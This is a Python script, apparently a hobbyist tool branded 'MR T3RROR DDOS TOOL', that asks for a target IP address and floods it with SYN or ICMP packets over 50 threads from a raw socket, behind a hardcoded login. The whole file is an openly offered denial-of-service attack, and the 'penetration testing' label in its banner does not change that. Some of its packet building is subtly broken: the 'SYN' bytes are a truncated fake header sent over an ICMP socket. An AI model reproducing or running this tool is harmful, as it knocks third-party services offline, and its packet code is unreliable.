import os
import time
import socket
import random
import threading
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(filename='ddos_tool.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def print_logo():
    os.system("clear")
    print("\033[92m")
    print("   ╔════════════════════════════════╗")
    print("   ║    MR T3RROR DDOS TOOL         ║")
    print("   ║  CIVILIAN CYBER EXPERT FORCE  ║")
    print("   ╚════════════════════════════════╝")
    print("\n")

def login():
    print("\033[92m")
    print("   ╔════════════════════════════╗")
    print("   ║      LOGIN TO CONTINUE     ║")
    print("   ╚════════════════════════════╝")
    attempts = 0
    while attempts < 3:
        username = input("\n   ➤ Enter Username: ")
        password = input("   ➤ Enter Password: ")
        if username == "CCEF" and password == "CCEF":
            print("\n   ✅ Login Successful!\n")
            time.sleep(1)
            os.system("clear")
            return True
        else:
            attempts += 1
            print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print("\n   ❌ Access Denied! Exiting...\n")
    exit()

def loading_bar():
    print("\033[91m")
    for i in range(101):
        time.sleep(0.01)  # Faster loading
        print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print("\n\n")

def get_target_details():
    print("\033[93m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║          ENTER TARGET DETAILS            ║")
    print("   ╚══════════════════════════════════════════╝")
    while True:
        try:
            ip = input("\n   ➤ Enter Target IP Address: ")
            # Not asking for a port because it's a portless attack (SYN or ICMP flood)
            break
        except ValueError as e:
            print(f"   ❌ Error: {e}. Please enter valid values.")
    print("\n   ✅ Details received successfully.\n")
    return ip

def print_ddos_banner():
    print("\033[96m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║        MR T3RROR DDOS TOOL               ║")
    print("   ║  POWERFUL ATTACKS FOR PENETRATION TESTING ║")
    print("   ╚══════════════════════════════════════════╝")
    print("\n")

def send_syn_packet(sock, ip):
    """Function to send a SYN packet (no port specified, just targeting IP layer)"""
    # Create a fake IP header (without specific ports)
    ip_header = b'\x45\x00\x00\x3c\x1c\x46\x40\x00\x40\x06\xb1\xe6'  # Fake TCP/IP header
    sock.sendto(ip_header, (ip, 0))  # SYN packet without specific port

def send_icmp_packet(sock, ip):
    """Function to send ICMP (ping) packets"""
    icmp_header = b'\x08\x00\x7f\x00\x00\x00'  # Fake ICMP Echo request packet
    sock.sendto(icmp_header, (ip, 0))  # ICMP packet without port specification

def flood_attack(ip, attack_type, threads_count):
    """Function to perform a flooding attack without a specified port"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  # Raw socket for ICMP
    sock.settimeout(2)
    print(f"\n   🚀 {attack_type} Attack started on {ip}")
    logging.info(f"{attack_type} Attack started on {ip}")

    # Threaded attack
    def attack_thread():
        packet_count = 0
        while True:
            if attack_type == "SYN Flood":
                send_syn_packet(sock, ip)  # Sending SYN packet
            elif attack_type == "ICMP Flood":
                send_icmp_packet(sock, ip)  # Sending ICMP (ping) packet
            packet_count += 1
            print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip}")

    # Creating multiple threads for parallel packet sending
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack_thread)
        threads.append(thread)
        thread.start()

    # Wait for threads to finish
    for thread in threads:
        thread.join()

def main():
    print_logo()
    if login():
        print_ddos_banner()
        loading_bar()
        ip = get_target_details()

        # Set custom parameters for stronger attack
        threads_count = 50  # Use 50 threads for a stronger attack

        # Choose attack type (SYN Flood or ICMP Flood)
        attack_type = input("\n   ➤ Choose Attack Type (SYN Flood/ICMP Flood): ").strip()
        if attack_type not in ["SYN Flood", "ICMP Flood"]:
            print("\n   ❌ Invalid attack type! Choose either 'SYN Flood' or 'ICMP Flood'.")
            exit()

        flood_attack(ip, attack_type, threads_count)
    else:
        print("\033[91m   ❌ Access Denied! Please try logging in again.")

if __name__ == "__main__":
    main()